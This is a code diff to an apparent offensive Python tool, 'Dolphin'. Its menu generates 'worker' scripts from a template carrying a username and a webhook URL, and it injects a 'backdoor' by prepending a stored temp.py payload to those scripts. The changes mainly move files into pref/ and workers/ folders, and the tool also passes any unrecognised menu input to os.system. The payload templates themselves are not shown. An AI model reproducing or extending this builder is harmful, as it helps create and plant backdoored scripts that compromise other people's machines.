@@ -203,7 +203,7 @@ signal.signal(signal.SIGTERM, cleanup)
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=8080, debug=True)
     """
-
+########################################^^^^^^ whole main app.py script
 def menu():
     os.system("clear")
     print(dolphin)
@@ -213,10 +213,11 @@ def menu():
     print("[1] run Terminal Script")
     print("[2] Create Worker Script")
     print("[3] show my scripts")
-    print("[4] clear scripts.txt")
+    print("[4] clear pref/scripts.txt")
     print("[5] create backdoor script")
     print("[6] show menu")
     print("[99] Exit")
+    print("[100] Restart")
     print("")
 
 
@@ -226,7 +227,7 @@ def show_menu():
     if choice == '1':
         print("Starting the Terminal ...\n")
         try:
-            command = ["python3", "Terminal.py"]
+            command = ["python3", "pref/Terminal.py"]
             process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             print(f"Terminal now running with PID {process.pid}...\n")
             print(f"If there is no Terminal on your screen make sure you have the Terminal.py script\nIf this is not the case then Either update repository immidiently or Get the Terminal script from github\n\nhttps://github.com/ArcticHonour/Dolphin/\n")
@@ -237,25 +238,26 @@ def show_menu():
         start_worker()
     elif choice == '3':
         try:
-            file = open("scripts.txt", "r")
+            file = open("pref/scripts.txt", "r")
             data = file.read()
             print(data)
             file.close()
         except:
-            file = open("scripts.txt", "w")
+            file = open("pref/scripts.txt", "w")
             file.write(str(record_1))
             file.close()
-            file = open("scripts.txt", "r")
+            file = open("pref/scripts.txt", "r")
             data = file.read()
+            file.close()
             print(data)
     elif choice == '4':
         try:
-            file = open("scripts.txt", "w")
+            file = open("pref/scripts.txt", "w")
             file.write("")
             file.close()
-            print("succesfully cleared scripts.txt")
+            print("succesfully cleared pref/scripts.txt")
         except:
-            print("Error, no scripts.txt found")
+            print("Error, no pref/pref/scripts.txt found")
     elif choice == '5':
         backdoor()
     elif choice == '6':
@@ -266,6 +268,8 @@ def show_menu():
     elif choice == "clear":
         os.system("clear")
         menu()
+    elif choice == "100":
+        exit()
     else:
         os.system(choice)
         show_menu()
@@ -275,6 +279,8 @@ def start_master():
 
 def start_worker():
     script_name = input("Enter name of file (e.g., worker_script): ")
+    if script_name[len(script_name)-3:len(script_name)] != ".py":
+        script_name = script_name + ".py"
     username = input("Enter the username for the worker: ")
     hook_url = input("Enter the webhook URL: ")
     array = [[script_name],[username],[hook_url]]
@@ -282,46 +288,51 @@ def start_worker():
     template = part1.format(username=username, hook_url=hook_url,)
     script = template + part2
     try:
-        file = open(f"{script_name}", "w")
+        file = open(f"workers/{script_name}", "w")
         file.write(script)
-        print(f"Worker script '{script_name}' has been created with the username '{username}' and webhook URL {hook_url}.")
+        print(f"Worker script '{script_name}' has been created with the username '{username}' and webhook URL {hook_url}, saved in workers.")
         file.close()
     except Exception as e:
         print(f"error {e}")
         
-        try:
-            file = open("scripts.txt", "a")
-            file.write("\n")
-            file.write(str(array))
-            file.close()
-        except:
-            file = open("scripts.txt", "w")
-            file.write("\n")
-            file.write(str(record_1))
-            file.close()
-            file = open("scripts.txt", "a")
-            file.write("\n")
-            file.write(str(array))
-            file.close()
+    try:
+        file = open("pref/scripts.txt", "a")
+        print("a")
+        file.write("\n")
+        file.write(str(array))
+        file.close()
+    except:
+        file = open("pref/scripts.txt", "w")
+        print("B")
+        file.write("\n")
+        file.write(str(record_1))
+        file.close()
+        file = open("pref/scripts.txt", "a")
+        file.write("\n")
+        file.write(str(array))
+        file.close()
             
 def backdoor():
-    os.system("ls")
-    script_name = input("Enter the name of your script with .py ending:")
+    os.system("ls workers")
+    script_name = input("Enter the name of your script name:")
+    if script_name[len(script_name)-3:len(script_name)] != ".py":
+        script_name = script_name + ".py"
     try:
-        file =  open(f"{script_name}", "r")
+        file =  open(f"workers/{script_name}", "r")
         contents = file.read()
         file.close()
-        file = open("temp.py", "r")
+        file = open("pref/temp.py", "r")
         backdoor_temp = file.read()
         backdoor_script = backdoor_temp + contents
         file.close()
-        file = open(f"{script_name}", "w")
+        file = open(f"workers/{script_name}", "w")
         file.write(backdoor_script)
         print(f"Backdoor added to {script_name}.")
     except FileNotFoundError:
         print(f"File {script_name} or 'temp.py' not found.")
     except Exception as e:
         print(f"Error adding backdoor: {e}")
+        file.close()
         
 def loading_animation():
     import time
